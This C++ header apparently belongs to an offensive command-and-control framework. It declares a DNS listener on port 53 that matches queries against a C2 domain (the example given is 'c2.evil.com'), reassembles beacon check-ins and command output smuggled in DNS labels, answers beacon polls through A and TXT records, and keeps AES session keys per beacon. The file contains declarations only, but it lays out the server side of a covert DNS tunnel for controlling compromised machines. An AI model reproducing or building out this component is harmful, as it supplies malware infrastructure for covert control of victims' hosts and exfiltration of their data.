#pragma once

#include "../../core/ListenerManager.hpp"
#include <co2h/bytes.hpp>
#include <co2h/crypto.hpp>
#include <asio.hpp>

#include <array>
#include <mutex>
#include <string>
#include <unordered_map>
#include <vector>

namespace co2h::server { class Core; }

namespace co2h::server::dns_c2 {

struct DnsConfig {
    std::string    name;
    std::string    bind_host   = "0.0.0.0";
    std::uint16_t  bind_port   = 53;
    std::string    c2_domain;       // e.g. "c2.evil.com" — suffix matched in queries
    crypto::AesKey listener_key;
    Bytes          rsa_pub_blob;
    Bytes          rsa_priv_blob;
};

class DnsListener
    : public Listener,
      public std::enable_shared_from_this<DnsListener> {
public:
    DnsListener(std::shared_ptr<Core> core, DnsConfig cfg);

    void start()  override;
    void stop()   override;

    std::string name()      const override { return cfg_.name; }
    std::string kind()      const override { return "dns"; }
    std::string bind_addr() const override {
        return cfg_.bind_host + ":" + std::to_string(cfg_.bind_port);
    }
    std::string key_hex()    const override;
    std::string pubkey_hex() const override;
    std::string domain()     const override { return cfg_.c2_domain; }

    const crypto::AesKey& listener_key_data() const override { return cfg_.listener_key; }
    BytesView rsa_priv_data() const override {
        return {cfg_.rsa_priv_blob.data(), cfg_.rsa_priv_blob.size()};
    }

private:
    // Reassembly state per txid while upload is in progress.
    struct UploadSession {
        char     frame_type = 'c';   // 'c' checkin / 'o' output
        std::unordered_map<std::uint16_t, Bytes> chunks;
    };

    // Live beacon session keyed by txid (established after checkin).
    struct BeaconSession {
        std::string    beacon_id;
        crypto::AesKey session_key{};
        Bytes          pending_reply;   // non-empty until first poll consumes it
    };

    void start_receive();
    void handle_receive(std::size_t bytes, const asio::ip::udp::endpoint& sender);

    // Parse QNAME from DNS packet at byte offset pos.
    // Fills labels; returns offset after QTYPE+QCLASS, or 0 on error.
    int parse_qname(const std::uint8_t* pkt, int pkt_len, int pos,
                    std::vector<std::string>& labels);

    // Strip c2_domain suffix from the label vector.
    // Returns the remaining prefix labels, or empty if domain does not match.
    std::vector<std::string> strip_domain(const std::vector<std::string>& labels);

    // Wire helpers.
    void send_a  (const asio::ip::udp::endpoint& ep,
                  const std::uint8_t* query, int qlen, std::uint32_t ip);
    void send_txt(const asio::ip::udp::endpoint& ep,
                  const std::uint8_t* query, int qlen,
                  const std::string& hex_data);

    // Dispatch handlers.
    void handle_upload_chunk(const asio::ip::udp::endpoint& ep,
                             const std::uint8_t* query, int qlen,
                             const std::vector<std::string>& labels);
    void handle_fin         (const asio::ip::udp::endpoint& ep,
                             const std::uint8_t* query, int qlen,
                             const std::vector<std::string>& labels);
    void handle_poll        (const asio::ip::udp::endpoint& ep,
                             const std::uint8_t* query, int qlen,
                             const std::vector<std::string>& labels);

    // Process a fully reassembled frame.
    void process_frame(const std::string& txid, char frame_type,
                       const Bytes& frame,
                       const asio::ip::udp::endpoint& sender_ep);

    std::shared_ptr<Core>           core_;
    DnsConfig                       cfg_;
    asio::ip::udp::socket           socket_;
    asio::ip::udp::endpoint         sender_ep_;
    std::array<std::uint8_t, 4096>  recv_buf_{};

    std::mutex                                          mu_;
    std::unordered_map<std::string, UploadSession>      uploads_;   // txid → in-flight upload
    std::unordered_map<std::string, BeaconSession>      sessions_;  // txid → live session
};

} // namespace co2h::server::dns_c2
